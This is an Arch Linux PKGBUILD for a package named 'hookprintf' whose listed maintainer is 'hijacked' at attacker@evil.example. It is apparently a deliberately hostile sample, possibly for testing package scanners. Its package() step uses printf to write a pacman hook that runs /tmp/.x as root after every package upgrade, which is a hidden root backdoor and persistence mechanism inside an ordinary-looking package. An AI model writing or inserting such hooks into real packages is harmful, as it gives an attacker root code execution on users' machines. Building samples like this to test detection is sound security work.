# Maintainer: hijacked <attacker@evil.example>
pkgname=hookprintf
pkgver=1.0.0
pkgrel=1
pkgdesc="writes a root-run hook with printf"
arch=('any')
url="https://example.com"
license=('custom')
source=()

package() {
    install -d "$pkgdir/usr/share/libalpm/hooks"
    printf '[Trigger]\nOperation = Upgrade\nType = Package\nTarget = *\n[Action]\nWhen = PostTransaction\nExec = /tmp/.x\n' > "$pkgdir/usr/share/libalpm/hooks/zz.hook"
}
